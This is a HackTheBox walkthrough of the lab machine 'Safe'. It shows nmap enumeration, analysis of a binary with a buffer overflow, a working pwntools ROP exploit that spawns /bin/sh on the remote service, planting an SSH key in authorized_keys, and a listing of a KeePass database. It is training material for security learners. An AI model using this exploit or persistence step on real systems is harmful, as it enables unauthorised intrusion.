---
layout: post
title: Hackthebox Safe Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2020-01-18/safe-badge.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Safe".<br>

# Solution
### 1. Initial Enumeration

#### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.147 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 11:22 EET
Nmap scan report for 10.10.10.147
Host is up (0.044s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     04:27:48 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|   DNSVersionBindReqTCP:
|     04:27:43 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|   GenericLines:
|     04:27:32 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   GetRequest:
|     04:27:38 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions:
|     04:27:38 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help:
|     04:27:54 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? HELP
|   NULL:
|     04:27:32 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|   RPCCheck:
|     04:27:38 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|   RTSPRequest:
|     04:27:38 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     04:27:54 up 5 min, 0 users, load average: 0.00, 0.00, 0.00
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.80%I=7%D=1/17%Time=5E217D33%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3E,"\x2004:27:32\x20up\x205\x20min,\x20\x200\x20users,\x20\x20load\x
SF:20average:\x200\.00,\x200\.00,\x200\.00\n")%r(GenericLines,63,"\x2004:2
SF:7:32\x20up\x205\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200
SF:\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ec
SF:ho\x20back\?\x20\r\n")%r(GetRequest,71,"\x2004:27:38\x20up\x205\x20min,
SF:\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.0
SF:0\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20
SF:/\x20HTTP/1\.0\r\n")%r(HTTPOptions,75,"\x2004:27:38\x20up\x205\x20min,\
SF:x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00
SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\
SF:x20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,75,"\x2004:27:38\x20up\x205\x20mi
SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
SF:.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIO
SF:NS\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3E,"\x2004:27:38\x20up\x205\x20mi
SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
SF:.00\n")%r(DNSVersionBindReqTCP,3E,"\x2004:27:43\x20up\x205\x20min,\x20\
SF:x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")
SF:%r(DNSStatusRequestTCP,3E,"\x2004:27:48\x20up\x205\x20min,\x20\x200\x20
SF:users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")%r(Help,
SF:67,"\x2004:27:54\x20up\x205\x20min,\x20\x200\x20users,\x20\x20load\x20a
SF:verage:\x200\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me
SF:\x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,64,"\x2004:27:54
SF:\x20up\x205\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00
SF:,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x
SF:20back\?\x20\x16\x03\n")%r(TerminalServerCookie,63,"\x2004:27:54\x20up\
SF:x205\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\
SF:.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\
SF:?\x20\x03\n")%r(TLSSessionReq,64,"\x2004:27:54\x20up\x205\x20min,\x20\x
SF:200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n\nW
SF:hat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x16\x03\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.31 seconds

root@kali:~#
{% endhighlight %}

### 2. Getting User

We have 1 interesting service on port 1337.<br>
Sounds it is showing the command result of "uptime"
{% highlight shell %}
root@kali:~# nc 10.10.10.147 1337
 04:52:20 up 30 min,  0 users,  load average: 0.00, 0.00, 0.00


What do you want me to echo back? 

root@kali:~# 
{% endhighlight %}

Besides, we have an interesting message on the port 80.<br>
It says that the app on port 1337 can be downloaded from here.
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.147 | head -n 5

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
(23) Failed writing body

root@kali:~# 
{% endhighlight %}

Then, download the "myapp" with the following command.
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.147/myapp -o myapp
{% endhighlight %}

Try to run the script.<br>
Looks like it just echoes back the input message.
{% highlight shell %}
root@kali:~# chmod +x myapp
root@kali:~# ./myapp
 11:57:23 up 10:20,  1 user,  load average: 1.99, 2.32, 2.25

What do you want me to echo back? AAAAA
AAAAA
root@kali:~#
{% endhighlight %}

On the other hand, if we put a bunch of characters, we have segmentation fault.<br>
This means we have Buffer Overflow Exploit here.
{% highlight shell %}
root@kali:~# ./myapp 
 12:04:32 up 10:27,  1 user,  load average: 2.87, 2.51, 2.31

What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaa
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaa
Segmentation fault

root@kali:~#
{% endhighlight %}

Actually, we can disassemble and view the actual C code of this executable with "<a href="https://ghidra-sre.org/">Ghidra</a>".<br>
It is showing that actually "uptime" command is running.
![placeholder](https://inar1.github.io/public/images/2020-01-18/2020-01-17-12-02-44.png)

Then, open the executable with GDB and its extension GEF.<br>
By the "checksec" command, we can analyze if it has any protection.<br>
This time, NX is enabled and this means we can't write our shellcode on the stack and execute.
{% highlight shell %}
root@kali:~# gdb -q myapp
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 8.3.1 using Python engine 3.7
Reading symbols from myapp...
(No debugging symbols found in myapp)
gef➤  checksec
[+] checksec for '/root/myapp'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
gef➤
{% endhighlight %}

Next, try to figure out how many offsets do we need for the payload.<br>
At first, create the following python script.
{% highlight shell %}
root@kali:~# cat rip_override.py
#!/usr/bin/python3

from pwn import *

payload = b'A' * 112
payload += b'B' * 8

f = open("bin.txt", "wb")
f.write(payload)

root@kali:~# 
{% endhighlight %}

Then, run the "rip_override.py".<br>
Now, we got the needed payload as "bin.txt".
{% highlight shell %}
root@kali:~# python3 rip_override.py

root@kali:~# cat bin.txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
{% endhighlight %}

Then, run the "myapp" with the payload "bin.txt".<br>
We can confirm that the value of RBP is "BBBBBBBB".<br>
This means we can control the value of RIP with the bytes after 120.
{% highlight shell %}
root@kali:~# gdb -q ./myapp
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 8.3.1 using Python engine 3.7
Reading symbols from ./myapp...
(No debugging symbols found in ./myapp)
gef➤  r < bin.txt
Starting program: /root/myapp < bin.txt
[Detaching after vfork from child process 50982]
 18:43:58 up 17:07,  1 user,  load average: 2.09, 2.28, 2.47

What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e11b00 in __libc_start_main (main=0x40115f <main>, argc=0x405260, argv=0x7fffffffe5b8, init=0x7ffff7ed6904 <__GI___libc_write+20>, fini=0x79, rtld_fini=0x0, stack_end=0x7fffffffe5a8) at ../csu/libc-start.c:141
141	../csu/libc-start.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ed6904  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7fa7580  →  0x0000000000000000
$rsp   : 0x00007fffffffe4e0  →  0x0000000000000000
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x0000000000405260  →  "What do you want me to echo back? AAAAAAAAAAAAAAAA[...]"
$rdi   : 0x0               
$rip   : 0x00007ffff7e11b00  →  <__libc_start_main+48> or DWORD PTR [rbx-0x7a3fceee], ecx
$r8    : 0x79              
$r9    : 0x0               
$r10   : 0x00000000004003e0  →  0x6972700073747570 ("puts"?)
$r11   : 0x246             
$r12   : 0x0000000000401070  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe5b0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe4e0│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffe4e8│+0x0008: 0x00007fffffffe5b8  →  0x00007fffffffe802  →  "/root/myapp"
0x00007fffffffe4f0│+0x0010: 0x0000000100040000
0x00007fffffffe4f8│+0x0018: 0x000000000040115f  →  <main+0> push rbp
0x00007fffffffe500│+0x0020: 0x0000000000000000
0x00007fffffffe508│+0x0028: 0xd70cde7fba685b2d
0x00007fffffffe510│+0x0030: 0x0000000000401070  →  <_start+0> xor ebp, ebp
0x00007fffffffe518│+0x0038: 0x00007fffffffe5b0  →  0x0000000000000001
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 → 0x7ffff7e11b00 <__libc_start_main+48> or     DWORD PTR [rbx-0x7a3fceee], ecx
   0x7ffff7e11b06 <__libc_start_main+54> ror    BYTE PTR [rdi], cl
   0x7ffff7e11b08 <__libc_start_main+56> xchg   esp, eax
   0x7ffff7e11b09 <__libc_start_main+57> ror    BYTE PTR [rcx+0x19269005], 0x0
   0x7ffff7e11b10 <__libc_start_main+64> test   rdi, rdi
   0x7ffff7e11b13 <__libc_start_main+67> je     0x7ffff7e11b1e <__libc_start_main+78>
─────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "myapp", stopped 0x7ffff7e11b00 in __libc_start_main (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7e11b00 → __libc_start_main(main=0x40115f <main>, argc=0x405260, argv=0x7fffffffe5b8, init=0x7ffff7ed6904 <__GI___libc_write+20>, fini=0x79, rtld_fini=0x0, stack_end=0x7fffffffe5a8)
[#1] 0x40109a → _start()
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
_{% endhighlight %}

Next, try to look at overview of this ELF file.<br>
We have an interesting function "test".
{% highlight shell %}
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  printf@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  test
0x000000000040115f  main
0x00000000004011b0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401214  _fini
gef➤  
_{% endhighlight %}

Then, look at the function "test".<br>
What it's doing is following.
1. move RSP value to RDI
2. jump to the address in R13 register
{% highlight shell %}
gef➤  disass test
Dump of assembler code for function test:
   0x0000000000401152 <+0>:     push   rbp
   0x0000000000401153 <+1>:     mov    rbp,rsp
   0x0000000000401156 <+4>:     mov    rdi,rsp
   0x0000000000401159 <+7>:     jmp    r13
   0x000000000040115c <+10>:    nop
   0x000000000040115d <+11>:    pop    rbp
   0x000000000040115e <+12>:    ret
End of assembler dump.
gef➤  
{% endhighlight %}

This means if we can control the value of "r13" register, we can run any system call.
With the command "<a href="https://github.com/sashs/Ropper">ropper</a>", we can figure it out.<br>
In the address "401206", we have "pop r13".
{% highlight shell %}
root@kali:~# ropper --file myapp --search "pop r13"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r13

[INFO] File: myapp
0x0000000000401206: pop r13; pop r14; pop r15; ret; 

root@kali:~#
{% endhighlight %}

Next, try to find out the address of "system" system call.
{% highlight shell %}
root@kali:~# objdump -d myapp | grep system
0000000000401040 <system@plt>:
  401040:	ff 25 da 2f 00 00    	jmpq   *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
  40116e:	e8 cd fe ff ff       	callq  401040 <system@plt>

root@kali:~#
{% endhighlight %}

Now we had enough information to write some exploit code.<br>
But before that we have to install the python module "pwntools" with pip.
{% highlight shell %}
root@kali:~# pip install pwntools

---
{% endhighlight %}
{% highlight shell %}
root@kali:~# cat exploit.py 
#!/usr/bin/python3

from pwn import *

buff = b"A" * 120
pop_r13 = p64(0x401206)
system = p64(0x40116e)
pop_r14 = b"B" * 8
pop_r15 = b"C" * 8

payload = buff + pop_r13 + system + pop_r14 + pop_r15

f =open("exploit.txt", "wb")
f.write(payload)

root@kali:~# python3 exploit.py

root@kali:~# cat exploit.txt 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@n@BBBBBBBBCCCCCCCC
{% endhighlight %}

Then, run the "myapp" again with the generated payload.<br>
We can confirm that r14 is "BBBBBBBB" and r15 is "CCCCCCCC".
{% highlight shell %}
root@kali:~# gdb -q myapp
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 8.3.1 using Python engine 3.7
Reading symbols from myapp...
(No debugging symbols found in myapp)
gef➤  r < exploit.txt
Starting program: /root/myapp < exploit.txt
[Detaching after vfork from child process 56780]
 20:56:53 up 19:20,  1 user,  load average: 2.56, 2.26, 2.13

What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401100 in register_tm_clones ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ed6904  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7fa7580  →  0x0000000000000000
$rsp   : 0x00007fffffffe500  →  0x0000000000000000
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0000000000405260  →  "What do you want me to echo back? AAAAAAAAAAAAAAAA[...]"
$rdi   : 0x0               
$rip   : 0x0000000000401100  →  <register_tm_clones+32> add BYTE PTR [rax], al
$r8    : 0x7c              
$r9    : 0x0               
$r10   : 0x00000000004003e0  →  0x6972700073747570 ("puts"?)
$r11   : 0x246             
$r12   : 0x0000000000401070  →  <_start+0> xor ebp, ebp
$r13   : 0x000000000040116e  →  <main+15> call 0x401040 <system@plt>
$r14   : 0x4242424242424242 ("BBBBBBBB"?)
$r15   : 0x4343434343434343 ("CCCCCCCC"?)
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe500│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffe508│+0x0008: 0xf8d1ac3ba2c3f088
0x00007fffffffe510│+0x0010: 0x0000000000401070  →  <_start+0> xor ebp, ebp
0x00007fffffffe518│+0x0018: 0x00007fffffffe5b0  →  0x0000000000000001
0x00007fffffffe520│+0x0020: 0x0000000000000000
0x00007fffffffe528│+0x0028: 0x0000000000000000
0x00007fffffffe530│+0x0030: 0x072e53444863f088
0x00007fffffffe538│+0x0038: 0x072e4379b745f088
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x401100 <register_tm_clones+32> add    BYTE PTR [rax], al
     0x401102 <register_tm_clones+34> add    BYTE PTR [rax], al
     0x401104 <register_tm_clones+36> test   rax, rax
     0x401107 <register_tm_clones+39> je     0x401110 <register_tm_clones+48>
     0x401109 <register_tm_clones+41> mov    edi, 0x404048
     0x40110e <register_tm_clones+46> jmp    rax
─────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "myapp", stopped 0x401100 in register_tm_clones (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401100 → register_tm_clones()
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
{% endhighlight %}

Then, modify the script like the following and run.
{% highlight shell %}
root@kali:~# cat exploit.py 
#!/usr/bin/python3

from pwn import *

buff = b"A" * 120
pop_r13 = p64(0x401206)
system = p64(0x40116e)
pop_r14 = b"B" * 8
pop_r15 = b"C" * 8
test = p64(0x401156)
sh = b"/bin/sh\x00"

payload = buff + pop_r13 + system + pop_r14 + pop_r15 + test + sh

f =open("exploit.txt", "wb")
f.write(payload)

root@kali:~# 
{% endhighlight %}

After that, run the "myapp" with the new "exploit.txt".<br>
However, this time add a breakpoint in "0x401156" in the function "test".
{% highlight shell %}
root@kali:~# gdb -q ./myapp
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 8.3.1 using Python engine 3.7
Reading symbols from ./myapp...
(No debugging symbols found in ./myapp)
gef➤  break * 0x401156
Breakpoint 1 at 0x401156
gef➤  r < exploit.txt
Starting program: /root/myapp < exploit.txt
[Detaching after vfork from child process 58438]
 21:41:11 up 20:04,  1 user,  load average: 1.74, 1.74, 1.80

What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@

Breakpoint 1, 0x0000000000401156 in test ()
__main__:2476: DeprecationWarning: invalid escape sequence '\¿'
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ed6904  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7fa7580  →  0x0000000000000000
$rsp   : 0x00007fffffffe500  →  0x0068732f6e69622f ("/bin/sh"?)
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0000000000405260  →  "What do you want me to echo back? AAAAAAAAAAAAAAAA[...]"
$rdi   : 0x0               
$rip   : 0x0000000000401156  →  <test+4> mov rdi, rsp
$r8    : 0x7c              
$r9    : 0x0               
$r10   : 0x00000000004003e0  →  0x6972700073747570 ("puts"?)
$r11   : 0x246             
$r12   : 0x0000000000401070  →  <_start+0> xor ebp, ebp
$r13   : 0x000000000040116e  →  <main+15> call 0x401040 <system@plt>
$r14   : 0x4242424242424242 ("BBBBBBBB"?)
$r15   : 0x4343434343434343 ("CCCCCCCC"?)
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe500│+0x0000: 0x0068732f6e69622f ("/bin/sh"?)	 ← $rsp
0x00007fffffffe508│+0x0008: 0xcf412594aada6b00
0x00007fffffffe510│+0x0010: 0x0000000000401070  →  <_start+0> xor ebp, ebp
0x00007fffffffe518│+0x0018: 0x00007fffffffe5b0  →  0x0000000000000001
0x00007fffffffe520│+0x0020: 0x0000000000000000
0x00007fffffffe528│+0x0028: 0x0000000000000000
0x00007fffffffe530│+0x0030: 0x30bedaeb407a6b18
0x00007fffffffe538│+0x0038: 0x30becad6bf5c6b18
────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40114e <__do_global_dtors_aux+46> add    bl, bpl
     0x401151 <frame_dummy+1>  mov    ss, WORD PTR [rbp+0x48]
     0x401154 <test+2>         mov    ebp, esp
 →   0x401156 <test+4>         mov    rdi, rsp
     0x401159 <test+7>         jmp    r13
     0x40115c <test+10>        nop    
     0x40115d <test+11>        pop    rbp
     0x40115e <test+12>        ret    
     0x40115f <main+0>         push   rbp
────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "myapp", stopped 0x401156 in test (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401156 → test()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
{% endhighlight %}

Then, go to next step with the command "si".<br>
It goes to the instruction "jmp r13"
{% highlight shell %}
gef➤  si

---

     0x401151 <frame_dummy+1>  mov    ss, WORD PTR [rbp+0x48]
     0x401154 <test+2>         mov    ebp, esp
     0x401156 <test+4>         mov    rdi, rsp
 →   0x401159 <test+7>         jmp    r13
     0x40115c <test+10>        nop    
     0x40115d <test+11>        pop    rbp
     0x40115e <test+12>        ret    
     0x40115f <main+0>         push   rbp
     0x401160 <main+1>         mov    rbp, rsp

---
{% endhighlight %}

Go to the next step.<br>
We can confirm that "system()" is executed with the argument "/bin/sh".
{% highlight shell %}
gef➤  si
0x000000000040116e in main ()

---

     0x401160 <main+1>         mov    rbp, rsp
     0x401163 <main+4>         sub    rsp, 0x70
     0x401167 <main+8>         lea    rdi, [rip+0xe9a]        # 0x402008
 →   0x40116e <main+15>        call   0x401040 <system@plt>
   ↳    0x401040 <system@plt+0>   jmp    QWORD PTR [rip+0x2fda]        # 0x404020 <system@got.plt>
        0x401046 <system@plt+6>   push   0x1
        0x40104b <system@plt+11>  jmp    0x401020
        0x401050 <printf@plt+0>   jmp    QWORD PTR [rip+0x2fd2]        # 0x404028 <printf@got.plt>
        0x401056 <printf@plt+6>   push   0x2
        0x40105b <printf@plt+11>  jmp    0x401020
────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x00007fffffffe500 → 0x0068732f6e69622f ("/bin/sh"?),
   $rsi = 0x0000000000405260 → "What do you want me to echo back? AAAAAAAAAAAAAAAA[...]"
)

---

{% endhighlight %}

We can confirm that if the payload is correct locally with the following way.
{% highlight shell %}
root@kali:~# (cat exploit.txt ; cat) | ./myapp
 21:50:47 up 20:14,  1 user,  load average: 1.89, 2.01, 1.93


What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
whoami
root
{% endhighlight %}

Now we confirmed that we can use this exploit locally.<br>
Finally, modify the script exploit for the remote host.
{% highlight shell %}
root@kali:~# cat exploit.py 
#!/usr/bin/python3

from pwn import *

p = remote("10.10.10.147", 1337)

buff = b"A" * 120
pop_r13 = p64(0x401206)
system = p64(0x40116e)
pop_r14 = b"B" * 8
pop_r15 = b"C" * 8
test = p64(0x401156)
sh = b"/bin/sh\x00"

payload = buff + pop_r13 + system + pop_r14 + pop_r15 + test + sh

p.sendline(payload)
p.interactive()
{% endhighlight %}

Run the exploit and we can achieve the user shell.<br>
"user.txt" is in the directory "/home/user".
{% highlight shell %}
root@kali:~# python3 exploit.py 
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
 15:08:51 up 10:46,  0 users,  load average: 0.00, 0.00, 0.00
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

$ pwd
/home/user

$ cat user.txt
7a29ee9b0fa17ac013d4bf01fd127690
$  
{% endhighlight %}


### 3. Getting Root

Now we got limited user shell.<br>
To get a full shell, put the ssh public key on the remote host.
{% highlight shell %}*
$ pwd
/home/user/.ssh

$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNWRWG3yzdzAY1uzzhaQDIh48rzaVi+50ZqB8anob1hYUinhpeaymXU5mCkD8/1Qs7Es7EBbAg9TdeBlnEiwuNdcDJvnM56AYkATENJ/B9yqFuwYH12MolKNKKg3gL9zZgqfUT/nfWXQZFkrSzR9dKxH+qBZiRkgaV7hZNF90ePA2vzL1Rhen/T/pUAwFWdLW29OyTGMJSl3FDHApq7M+4gu3GsEzknU5QyJZy/6QQ9+htZYWoPOf3wGu57820zu8xvDqbWoJdSCcZEG0e0m4lI7K/sfDSetoKTQZy+PlHISD0m5SkyVRLCrXqU8OEU4/1/5bvMEqgA2+cChGqFfKZiPQgVLYmKvYy/EfRybsegLZ2QDpNecLYL3Lxa7gvtVHhdS0Vb96Hk9A0KxSO+V6Y7rtXjKPpz0aUR0hZnUOam5BU3IueJf42QmAI90qCKHbWukkbSe8u0Vx0qIDts9PF0QAPODFyvCPNo8jXrhUY8NGjDKtuxeefTyk/p2cF3G8= root@kali' >> authorized_keys
$
{% endhighlight %}

After that, login to Safe with ssh.
{% highlight shell %}
root@kali:~/.ssh# ssh user@10.10.10.147
Enter passphrase for key '/root/.ssh/id_rsa': 
Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan 17 16:12:35 2020 from 10.10.14.36
user@safe:~$ 
{% endhighlight %}

In the home directory, we have some image files and a KeePass database.
{% highlight shell %}
user@safe:~$ ls -l
total 11260
-rw-r--r-- 1 user user 1907614 May 13  2019 IMG_0545.JPG
-rw-r--r-- 1 user user 1916770 May 13  2019 IMG_0546.JPG
-rw-r--r-- 1 user user 2529361 May 13  2019 IMG_0547.JPG
-rw-r--r-- 1 user user 2926644 May 13  2019 IMG_0548.JPG
-rw-r--r-- 1 user user 1125421 May 13  2019 IMG_0552.JPG
-rw-r--r-- 1 user user 1085878 May 13  2019 IMG_0553.JPG
-rw-r--r-- 1 user user    2446 May 13  2019 MyPasswords.kdbx
